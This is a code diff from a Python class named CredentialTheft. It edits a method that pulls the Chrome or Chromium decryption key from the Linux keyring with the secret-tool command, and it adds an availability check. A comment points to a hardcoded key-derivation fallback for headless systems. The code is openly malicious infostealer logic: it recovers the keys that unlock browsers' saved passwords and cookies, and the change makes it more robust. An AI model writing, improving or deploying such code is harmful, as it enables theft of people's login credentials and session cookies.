@@ -169,19 +169,21 @@ class CredentialTheft:
             pass
 
         # Method 2: secret-tool CLI
-        try:
-            import subprocess
-            app_name = "chrome" if "chrome" in str(browser_config_dir).lower() else "chromium"
-            result = subprocess.run(
-                ["secret-tool", "lookup", "application", app_name],
-                capture_output=True, text=True, timeout=5
-            )
-            if result.returncode == 0 and result.stdout.strip():
-                key = result.stdout.strip().encode()
-                if len(key) in (16, 32):
-                    return key
-        except Exception:
-            pass
+        if not shutil.which("secret-tool"):
+            pass  # secret-tool not available on this system
+        else:
+            try:
+                app_name = "chrome" if "chrome" in str(browser_config_dir).lower() else "chromium"
+                result = subprocess.run(
+                    ["secret-tool", "lookup", "application", app_name],
+                    capture_output=True, text=True, timeout=5
+                )
+                if result.returncode == 0 and result.stdout.strip():
+                    key = result.stdout.strip().encode()
+                    if len(key) in (16, 32):
+                        return key
+            except Exception:
+                pass
 
         # Method 3: Chromium basic_text fallback (hardcoded derivation)
         # Used on headless servers / containers without keyring
